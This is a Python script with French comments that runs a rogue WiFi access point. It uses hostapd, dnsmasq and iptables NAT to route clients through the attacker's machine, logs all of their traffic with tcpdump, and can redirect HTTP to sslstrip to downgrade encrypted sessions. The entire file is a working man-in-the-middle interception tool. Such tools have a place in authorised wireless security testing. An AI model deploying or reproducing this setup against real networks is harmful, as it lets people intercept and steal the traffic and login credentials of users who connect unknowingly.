import subprocess
import sys
import time
import argparse
import os
import tempfile
import shutil  # Ajout pour la gestion des fichiers

###########################################################################################

def die(message):
    sys.stderr.write("%s\n" % message)
    exit(1)

def check_sslstrip():
    try:
        return not subprocess.call(["sslstrip", "--help"], stdout=null, stderr=null)
    except:
        return False

def check_hostapd():
    try:
        return subprocess.call(["hostapd", "--help"], stdout=null, stderr=null) != 127
    except:
        return False

def check_dnsmasq():
    try:
        return not subprocess.call(["dnsmasq", "--help"], stdout=null, stderr=null)
    except:
        return False

def check_tcpdump():
    try:
        return subprocess.call(["tcpdump", "--help"], stdout=null, stderr=null) != 127
    except:
        return False

def check_iptables():
    try:
        return not subprocess.call(["iptables", "--help"], stdout=null, stderr=null)
    except:
        return False

def check_ip():
    try:
        return not subprocess.call(["ip", "link", "show"], stdout=null, stderr=null)
    except:
        return False

def check_mergecap():  # Nouvelle fonction de vérification
    try:
        return subprocess.call(["mergecap", "--help"], stdout=null, stderr=null) != 127
    except:
        return False

def poll_iface_exists(iface):
    return not subprocess.call(["ip", "link", "show", iface], stdout=null, stderr=null)

null = open("/dev/null", "w")

###########################################################################################

### MAIN

parser = argparse.ArgumentParser()
parser.add_argument("wlan_interface", help="The Interface in monitor mode interface", type=str)
parser.add_argument("inet_interface", help="The Interface in monitor mode interface", type=str)
parser.add_argument("--ssid", help="Use this ssid for network", type=str, required=True)
parser.add_argument("--wpa", help="Sets up the passphrase for the network", type=str, required=True)
parser.add_argument("--channel", help="Use this channel", type=int, required=True)
parser.add_argument("--sslstrip", help="Use sslstrip", action="store_true")
parser.add_argument("--logdir", help="Directory to save captured data", type=str, default=".")  # Nouvel argument
args = parser.parse_args()

### Run preliminary checks

if os.geteuid(): die("You need to be root")
if not check_ip(): die("ip command absent or broken")
if not check_tcpdump(): die("tcpdump command absent or broken")
if not check_mergecap(): die("mergecap command absent or broken")  # Nouvelle vérification
if not check_iptables(): die("iptables absent or broken")
if not check_dnsmasq(): die("dnsmasq command absent or broken")
if not check_hostapd(): die("hostapd command absent or broken")
if args.sslstrip and not check_sslstrip(): die("sslstrip command absent or broken")

if not poll_iface_exists(args.wlan_interface): die("%s is not a valid interface" % args.wlan_interface)
if not poll_iface_exists(args.inet_interface): die("%s is not a valid interface" % args.inet_interface)
if (len(args.wpa) < 8) or (len(args.wpa) > 63): die("wpa passphrase needs to be 8-63 characters")

# Création des répertoires temporaires pour les logs
log_temp_dir = tempfile.mkdtemp()
log_pcap_dir = os.path.join(log_temp_dir, "pcap")
os.makedirs(log_pcap_dir, exist_ok=True)
os.makedirs(args.logdir, exist_ok=True)  # Crée le répertoire de sortie

print("Starting Rogue AP\n")
print("Running")

### init
subprocess.call(["iw", "dev", args.wlan_interface, "set", "channel", str(args.channel)], stdout=null, stderr=null)

iface = args.wlan_interface

with open("/proc/sys/net/ipv4/ip_forward", "r") as f: ip_forward = f.read().strip()
with open("/proc/sys/net/ipv4/ip_forward", "w") as f: f.write("1")
subprocess.call(["iptables", "-I", "FORWARD", "-i", iface, "-o", args.inet_interface, "-j", "ACCEPT"], stdout=null, stderr=null)
subprocess.call(["iptables", "-I", "FORWARD", "-o", iface, "-i", args.inet_interface, "-j", "ACCEPT"], stdout=null, stderr=null)
subprocess.call(["iptables", "-t", "nat", "-I", "POSTROUTING", "-o", args.inet_interface, "-j", "MASQUERADE"], stdout=null, stderr=null)

if args.sslstrip:
    subprocess.call(["iptables", "-t", "nat", "-I", "PREROUTING", "-p", "tcp", "--destination-port", "80", "-j", "REDIRECT", "--to-port", "10000"], stdout=null, stderr=null)

# Configuration hostapd
n, hostapd_path = tempfile.mkstemp()
with os.fdopen(n, "w") as f:
    f.write(f"interface={iface}\n")
    f.write("driver=nl80211\n")
    f.write(f"ssid={args.ssid}\n")
    f.write(f"channel={args.channel}\n")
    f.write("wpa=3\n")
    f.write(f"wpa_passphrase={args.wpa}\n")

# Configuration dnsmasq
n, dnsmasq_path = tempfile.mkstemp()
with os.fdopen(n, "w") as f:
    f.write(f"interface={iface}\n")
    f.write("dhcp-range=10.55.66.100,10.55.66.200,5m\n")
    f.write("dhcp-option=3,10.55.66.1\n")
    f.write("dhcp-option=6,10.55.66.1\n")
    f.write("no-hosts\n")
    f.write("addn-hosts=/dev/null\n")

def nukeall(popen_list):
    for popen in popen_list:
        if popen.poll() is None:
            popen.kill()
    popen_list.clear()

### run and restore loop
try:
    pids = []
    deathloop_count = -1
    while True:
        deathloop_count += 1
        print(f"********** INIT #{deathloop_count} *************")

        p = subprocess.Popen(["hostapd", hostapd_path])
        pids.append(p)

        print(f"waiting for interface '{iface}' to emerge")
        while not poll_iface_exists(iface):
            time.sleep(0.01)

        subprocess.call(["ifconfig", iface, "10.55.66.1", "netmask", "255.255.255.0", "up"])

        # Modification de la commande tcpdump pour sauvegarder les paquets
        pcap_file = os.path.join(log_pcap_dir, str(deathloop_count))
        p = subprocess.Popen(["tcpdump", "-i", iface, "-w", pcap_file], stdout=null, stderr=null)
        pids.append(p)

        if args.sslstrip:
            p = subprocess.Popen(["sslstrip", "-a", "-f"], stderr=null)
            pids.append(p)

        p = subprocess.Popen(["dnsmasq", "-d", "-C", dnsmasq_path])
        pids.append(p)

        while True:
            if any(pid.poll() is not None for pid in pids):
                break
            time.sleep(0.01)

        print("program in chain failed, restarting chain...\n")
        nukeall(pids)

except KeyboardInterrupt:
    pass

print("Stopping Rogue AP")
nukeall(pids)

# Fusion des fichiers .pcap
pcap_files = [os.path.join(log_pcap_dir, f) for f in os.listdir(log_pcap_dir) 
              if os.path.isfile(os.path.join(log_pcap_dir, f))]

if pcap_files:
    output_pcap = os.path.join(args.logdir, "capture.pcap")
    subprocess.call(["mergecap", "-w", output_pcap] + pcap_files, stdout=null, stderr=null)
    print(f"Captures merged into {output_pcap}")
else:
    print("No network captures to merge")

# Nettoyage
shutil.rmtree(log_temp_dir, ignore_errors=True)

with open("/proc/sys/net/ipv4/ip_forward", "w") as f: f.write(ip_forward)
subprocess.call(["iptables", "-D", "FORWARD", "-i", iface, "-o", args.inet_interface, "-j", "ACCEPT"], stdout=null, stderr=null)
subprocess.call(["iptables", "-D", "FORWARD", "-o", iface, "-i", args.inet_interface, "-j", "ACCEPT"], stdout=null, stderr=null)
subprocess.call(["iptables", "-t", "nat", "-D", "POSTROUTING", "-o", args.inet_interface, "-j", "MASQUERADE"], stdout=null, stderr=null)

if args.sslstrip:
    subprocess.call(["iptables", "-t", "nat", "-D", "PREROUTING", "-p", "tcp", "--destination-port", "80", "-j", "REDIRECT", "--to-port", "10000"], stdout=null, stderr=null)

subprocess.call(["ip", "addr", "flush", args.wlan_interface], stdout=null, stderr=null)
subprocess.call(["ip", "link", "set", args.wlan_interface, "down"], stdout=null, stderr=null)
subprocess.call(["iw", "dev", args.wlan_interface, "set", "type", "monitor"], stdout=null, stderr=null)
subprocess.call(["ip", "link", "set", args.wlan_interface, "up"], stdout=null, stderr=null)

os.remove(dnsmasq_path)
os.remove(hostapd_path)